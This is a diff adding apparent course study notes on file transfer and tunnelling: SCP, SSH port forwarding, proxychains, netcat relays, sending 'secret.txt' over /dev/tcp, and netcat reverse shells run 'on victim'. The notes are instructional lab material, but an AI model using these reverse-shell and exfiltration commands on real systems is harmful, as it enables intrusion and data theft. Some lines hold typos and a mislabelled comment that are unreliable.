@@ -1,0 +1,115 @@
+TUNNEL TIP
+> # Two things you need are:
+  > # Loopback
+  > # Port used for the tunnel
+SECURITY TIP
+> 
+
+
+Common Methods for transfering data
+> FTP
+  > Active (You order Pizza Delivery, they give you the data)
+  > Passive (You order pizza to pickup, you get the data from them)
+> SFTP [SECURE]
+  > TCP Transport (22)
+> SCP
+  > # Uses ssh to transport files
+  > # Symmetric and Asymmetric encryption
+  /> . (present working directory)
+  /> -v (verbose mode)
+  /> -r (recursively copy an entire directory)
+  /> -3 (3 way copy)
+
+  [SCP SYNTAX]
+  /> scp student@172.16.82.106:secretstuf.txt /home/student
+    > # Download file from remote to local
+  /> scp secretstuf.txt student@172m16m82,106:/home/student
+    > # Copy a file from remote to local
+  /> scp -3 student@172.16.82.106:/home/student/secretstuf.txt student@172.16.82.112:/home/student
+    > # 3rd party copying. You are computer c and you are copying stuff from computer a to b
+  /> scp -r folder/ student@172.16.82.106:
+    > # Recursive upload of a folder to remote
+  /> scp -r student@172.16.82.106:folder/ .
+    > # Recursive download of a folder from remote
+
+  [SCP SYNTAX W/ ALTERNATE SSHD]
+  /> scp -P 1111 student@172.16.82.106:secretstuff.txt .
+    > # Download a file from a remote directory to a local directory
+  /> scp -P 1111 secretstuff.txt student@172.16.82.106:
+    > # Upload a file to a remote directory from a local directory
+
+  [SCP SYNTAX THROUGH A TUNNEL]
+  /> ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+    > # Create a locl port forward to target device
+  /> scp -P 1111 student@localhost:secretstuf.txt /home/student
+    > # Download a file from a remote directory to a local directory
+  /> scp -P 1111 secretstuff.txt student@localhost:/home/student
+    > # Upload a fole to a remote directory from a local directory
+
+  [SCP SYNTAX THROUGH A DYNAMIC PORT FORWARD]
+  /> ssh student@172.16.82.106 -D 9050 -NT
+    > # Create a Dynamic port forward to target device
+  /> proxychains scp student@localhost:secretstuff.txt .
+    > # Download a file from a remote directory to a local directory
+  /> proxychains scp secretstuf.txt student@localhost:
+    > # Upload a file to a remote directory from a local directory
+
+
+Conduct Uncommon Methods of File Transfer
+> Netcat (Reads a writes data across network socket connections using TCP/IP protocol)
+  [CLIENT TO LISTENER FILE TRANSFER]
+  /> nc -lvp 9001 > newfile.txt
+    > # Listener (receive file)
+  /> nc 172.16.82.106 9001 < file.txt
+    > # Client (sends file)
+
+  [LISTENER TO CLIENT FILE TRANSFER]
+  /> nc -lvp 9001 < file.txt
+    > # Listener (sends file)
+  /> nc 172.16.82.106 9001 > newfile.txt
+    > # Cleint (recieve file)
+
+  [NETCAT RELAY LISTENER TO LISTENER]
+  /> mknod mypipe p (makes node) or mkfifo mypipe
+    > nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+
+  [EXAMPLE DIAGRAM]
+              nc -lvp 1111 < mypipe | nc -lvp 2222 > mypipe
+  
+          [1]   ----->            [2]             <-----  [3]
+         nc [2] 1111                              nc -lvp 1111
+                                                  (nc [2] 2222)
+
+  [NETCAT RELAY CLIENT TO CLIENT]
+  /> nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
+
+
+  [FILE TRANSFER WITH /DEV/TCP]
+  /> nc -lvp 1111 > devtcpfile.txt
+    > # On the recieving box
+  /> cat secret.txt > /dev/tcp/10.10.0.40/1111
+    > # This method is useful for a host that does not have NETCAT available
+
+Reverse shell using NetCat
+/> nc -lvp 9999
+  > # First listen for the shell on your device
+/> nc -c /bin/bash 10.10.0.40 9999
+  > # On victim using -c
+/> nc -e /bin/bash 10.10.0.40 9999
+  > # On victim using -e
+
+XXD
+/> echo "Hex encoding test" | xxd -p
+/> echo "48657820656e636f64696e6720746573740a" | xxd -r -p
+
+
+
+
+
+
+
+
+
+
+
+
